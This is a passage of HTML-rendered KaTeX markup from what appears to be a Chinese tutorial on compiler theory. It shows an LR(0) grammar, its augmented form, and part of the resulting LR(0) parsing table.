displaystyle=\"true\"><mrow><mrow></mrow><mi>B</mi><mo>→</mo><mi>c</mi><mi>B</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>B</mi><mo>→</mo><mi>d</mi></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\n&amp;E\\rightarrow aA \\\\\n&amp;E\\rightarrow bB\\\\\n&amp;A\\rightarrow cA\\\\\n&amp;A\\rightarrow d\\\\\n&amp;B\\rightarrow cB\\\\\n&amp;B\\rightarrow d\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:9.000000000000002em;vertical-align:-4.250000000000001em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:4.750000000000001em;\"><span style=\"top:-6.750000000000001em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-5.25em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-3.749999999999999em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-2.249999999999999em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-0.7499999999999996em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:0.7500000000000009em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:4.250000000000001em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:4.750000000000001em;\"><span style=\"top:-6.910000000000001em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">E</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">A</span></span></span><span style=\"top:-5.41em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">E</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">b</span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span></span></span><span style=\"top:-3.9099999999999993em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">c</span><span class=\"mord mathdefault\">A</span></span></span><span style=\"top:-2.4099999999999993em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">d</span></span></span><span style=\"top:-0.9099999999999997em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">c</span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span></span></span><span style=\"top:0.5900000000000007em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">d</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:4.250000000000001em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>把该文法托广：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mn>0.</mn><mtext>  </mtext><msup><mi>S</mi><msup><mrow></mrow><mo mathvariant=\"normal\">′</mo></msup></msup><mo>→</mo><mi>E</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mn>1.</mn><mtext>  </mtext><mi>E</mi><mo>→</mo><mi>a</mi><mi>A</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mn>2.</mn><mtext>  </mtext><mi>E</mi><mo>→</mo><mi>b</mi><mi>B</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mn>3.</mn><mtext>  </mtext><mi>A</mi><mo>→</mo><mi>c</mi><mi>A</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mn>4.</mn><mtext>  </mtext><mi>A</mi><mo>→</mo><mi>d</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mn>5.</mn><mtext>  </mtext><mi>B</mi><mo>→</mo><mi>c</mi><mi>B</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mn>6.</mn><mtext>  </mtext><mi>B</mi><mo>→</mo><mi>d</mi></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\n&amp;0.\\;S^{&#x27;}\\rightarrow E\\\\\n&amp;1.\\;E\\rightarrow aA \\\\\n&amp;2.\\;E\\rightarrow bB\\\\\n&amp;3.\\;A\\rightarrow cA\\\\\n&amp;4.\\;A\\rightarrow d\\\\\n&amp;5.\\;B\\rightarrow cB\\\\\n&amp;6.\\;B\\rightarrow d\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:10.65248em;vertical-align:-5.076239999999999em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.57624em;\"><span style=\"top:-7.57624em;\"><span class=\"pstrut\" style=\"height:2.99248em;\"></span><span class=\"mord\"></span></span><span style=\"top:-6.07624em;\"><span class=\"pstrut\" style=\"height:2.99248em;\"></span><span class=\"mord\"></span></span><span style=\"top:-4.57624em;\"><span class=\"pstrut\" style=\"height:2.99248em;\"></span><span class=\"mord\"></span></span><span style=\"top:-3.0762400000000008em;\"><span class=\"pstrut\" style=\"height:2.99248em;\"></span><span class=\"mord\"></span></span><span style=\"top:-1.5762400000000008em;\"><span class=\"pstrut\" style=\"height:2.99248em;\"></span><span class=\"mord\"></span></span><span style=\"top:-0.07624000000000075em;\"><span class=\"pstrut\" style=\"height:2.99248em;\"></span><span class=\"mord\"></span></span><span style=\"top:1.4237599999999992em;\"><span class=\"pstrut\" style=\"height:2.99248em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.076239999999999em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.57624em;\"><span style=\"top:-7.58376em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">E</span></span></span><span style=\"top:-6.08376em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\">1</span><span class=\"mord\">.</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">E</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">A</span></span></span><span style=\"top:-4.583760000000001em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\">2</span><span class=\"mord\">.</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">E</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">b</span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span></span></span><span style=\"top:-3.0837600000000007em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\">3</span><span class=\"mord\">.</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">c</span><span class=\"mord mathdefault\">A</span></span></span><span style=\"top:-1.5837600000000007em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\">4</span><span class=\"mord\">.</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">d</span></span></span><span style=\"top:-0.08376000000000072em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\">5</span><span class=\"mord\">.</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">c</span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span></span></span><span style=\"top:1.4162399999999993em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\">6</span><span class=\"mord\">.</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">d</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.076239999999999em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>推出识别<strong>活前缀</strong>的DFA：</p>\n<img src=\"/img/com.png\" class=\"\">\n<p>得到DFA后由此得到LR(0)分析表：</p>\n<table>\n<thead>\n<tr>\n<th>状态</th>\n<th>a</th>\n<th>b</th>\n<th>c</th>\n<th>d</th>\n<th>$</th>\n<th>E</th>\n<th>A</th>\n<th>B</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0</td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>S</mi><mn>1</mn></msub></mrow><annotation encoding=\"application/x-tex\">S_1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>S</mi><mn>2</mn></msub></mrow><annotation encoding=\"application/x-tex\">S_2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td></td>\n<td></td>\n<td></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mn>3</mn></mrow><annotation encoding=\"application/x-tex\">3</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">3</span></span></span></span></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>1</td>\n<td></td>\n<td></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>S</mi><mn>4</mn></msub></mrow><annotation encoding=\"application/x-tex\">S_4</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">4</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>S</mi><mn>5</mn></msub></mrow><annotation encoding=\"application/x-tex\">S_5</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">5</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td></td>\n<td></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mn>6</mn></mrow><annotation encoding=\"application/x-tex\">6</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">6</span></span></span></span></td>\n<td></td>\n</tr>\n<tr>\n<td>2</td>\n<td></td>\n<td></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>S</mi><mn>7</mn></msub></mrow><annotation encoding=\"application/x-tex\">S_7</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">7</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>S</mi><mn>8</mn></msub></mrow><annotation encoding=\"application/x-tex\">S_8</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">8</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td></td>\n<td></td>\n<td></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mn>9</mn></mrow><annotation encoding=\"application/x-tex\">9</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">9</span></span></span></span></td>\n</tr>\n<tr>\n<td>3</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>a</mi><mi>c</mi><mi>c</mi></mrow><annotation encoding=\"application/x-tex\">acc</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">c</span><span class=\"mord mathdefault\">c</span></span></span></span></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>4</td>\n<td></td>\n<td></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>S</mi><mn>4</mn></msub></mrow><annotation encoding=\"application/x-tex\">S_4</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">4</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>S</mi><mn>5</mn></msub></mrow><annotation encoding=\"application/x-tex\">S_5</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">5</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td></td>\n<td></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mn>10</mn></mrow><annotation encoding=\"application/x-tex\">10</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span><span class=\"mord\">0</span></span></span></span></td>\n<td></td>\n</tr>\n<tr>\n<td>5</td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>4</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_4</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">4</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>4</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_4</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">4</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>4</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_4</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">4</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>4</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_4</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">4</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>4</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_4</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">4</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>6</td>\n<td><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>r</mi><mn>1</mn></msub></mrow><annotation encoding=\"application/x-tex\">r_1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span 